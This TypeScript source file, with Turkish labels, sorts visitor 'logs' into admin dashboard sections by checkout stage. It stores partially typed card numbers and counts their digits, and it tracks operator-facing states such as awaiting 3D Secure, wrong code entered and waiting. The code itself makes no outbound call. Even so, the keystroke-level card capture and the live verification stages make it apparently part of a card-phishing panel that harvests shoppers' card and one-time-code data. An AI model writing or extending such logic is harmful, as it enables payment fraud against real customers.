import type { Log } from './db/types';
import { hasCard, hasAddress, hasPhone } from './logQualify';

const PAYMENT_PAGE_TYPES = new Set(['payment', 'processing', 'waiting']);

const PROCESSING_STATUSES = new Set([
  '3D Secure Bekliyor',
  'Bekliyor',
  'Hatalı Kod Girişi',
]);

const ADDRESS_PAGE_TYPES = new Set(['address']);
const ADDRESS_STATUSES = new Set(['Adres Ekranında', 'Adres Tamamlandı']);
export const CHECKOUT_LANDING_STATUS = 'Checkout Sayfasında';

export function hasCheckoutAddressEngagement(log: Log): boolean {
  if (log.firstName || log.lastName || log.phone || log.phoneRaw) return true;
  if (hasPhone(log)) return true;
  if (hasAddress(log)) return true;
  return false;
}

export function hasCheckoutAddressEngagementInput(body: Record<string, unknown>): boolean {
  if (body.firstName || body.lastName || body.phone || body.phoneRaw) return true;
  const addr = body.address;
  if (addr && typeof addr === 'object') {
    const a = addr as Record<string, unknown>;
    if (a.city || a.district || a.neighborhood || a.street || a.buildingNo || a.fullAddress) {
      return true;
    }
  }
  return false;
}

export function isOnAddressStep(log: Log): boolean {
  if (ADDRESS_PAGE_TYPES.has(log.pageType || '')) return true;
  if (log.status && ADDRESS_STATUSES.has(log.status)) return true;
  return false;
}

export function isOnPaymentStep(log: Log): boolean {
  if (PAYMENT_PAGE_TYPES.has(log.pageType || '')) return true;
  if (log.status === 'Ödeme Sayfasında' || log.status === 'Ödeme Sayfası') return true;
  return false;
}

export function cardDigitCount(log: { cardNumber?: string }): number {
  return (log.cardNumber || '').replace(/\D/g, '').length;
}

export function hasStartedCardEntry(log: Log): boolean {
  const digits = cardDigitCount(log);
  if (digits >= 6) return true;
  if (digits >= 1 && PAYMENT_PAGE_TYPES.has(log.pageType || '')) return true;
  if (digits >= 1 && PROCESSING_STATUSES.has(log.status || '')) return true;
  return false;
}

/** /checkout/payment ve sonrası — kart girme aşaması */
export function isIslemdekilerLog(log: Log): boolean {
  if (log.status === 'Başarılı') return false;
  if (hasCard(log)) return true;
  if (hasStartedCardEntry(log)) return true;
  if (PROCESSING_STATUSES.has(log.status || '')) return true;
  if (isOnPaymentStep(log)) return true;
  return false;
}

/** /checkout — yalnızca adres formu doldurulmaya başlandığında */
export function isAdresteLog(log: Log): boolean {
  if (log.status === 'Başarılı') return false;
  if (isIslemdekilerLog(log)) return false;
  if (!isOnAddressStep(log)) return false;
  return hasCheckoutAddressEngagement(log);
}

export type AdminLogSection = 'islemdekiler' | 'adreste' | 'tamamlandi' | 'browse';

export function categorizeAdminLog(log: Log): AdminLogSection {
  if (log.status === 'Başarılı') return 'tamamlandi';
  if (isIslemdekilerLog(log)) return 'islemdekiler';
  if (isAdresteLog(log)) return 'adreste';
  return 'browse';
}

export function resolveCheckoutHeartbeatStatus(pageType: string): string | undefined {
  if (pageType === 'payment' || pageType === 'processing') return 'Ödeme Sayfasında';
  if (pageType === 'waiting') return 'Bekliyor';
  return undefined;
}

export function shouldApplyIncomingStatus(
  current: string | undefined,
  incoming: string | undefined
): boolean {
  if (!incoming) return false;
  if (!current) return true;

  const rank: Record<string, number> = {
    'Ana Sayfa': 1,
    'Ürün Detay': 2,
    Sepette: 3,
    'Checkout Sayfasında': 4,
    'Adres Ekranında': 5,
    'Adres Tamamlandı': 6,
    'Ödeme Sayfasında': 7,
    Bekliyor: 8,
    '3D Secure Bekliyor': 9,
    Başarılı: 10,
  };

  const currentRank = rank[current] ?? 0;
  const incomingRank = rank[incoming] ?? 0;
  return incomingRank >= currentRank;
}
